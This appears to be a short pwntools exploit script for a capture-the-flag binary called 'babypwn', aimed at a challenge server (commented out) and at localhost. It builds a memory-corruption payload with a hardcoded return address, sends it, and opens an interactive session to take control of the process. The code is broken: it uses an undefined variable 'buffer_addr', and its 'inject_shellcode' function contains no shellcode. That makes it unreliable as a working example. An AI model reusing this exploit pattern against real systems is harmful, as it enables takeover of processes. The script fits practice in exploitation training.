import pwn

pwn.context.arch = 'amd64'

# sh = pwn.remote('chal.cybersecurityrumble.de', 1990)
sh = pwn.remote('127.0.0.1', 1990)
# sh = pwn.process('./babypwn')


def inject_shellcode():
    ret_addr_padding = 120

    payload = b'\0' * 8

    payload += pwn.p64(0x3)
    payload += pwn.p64(buffer_addr + 0x80 + 16)

    payload += pwn.p64(0x0000555555555193)

    print('Payload len: ', len(payload))
    return payload


payload = inject_shellcode()

with open('payload', 'wb') as f:
    f.write(payload)

sh.send(payload)
# print(sh.recvline())
# print(sh.recvline())
sh.interactive()
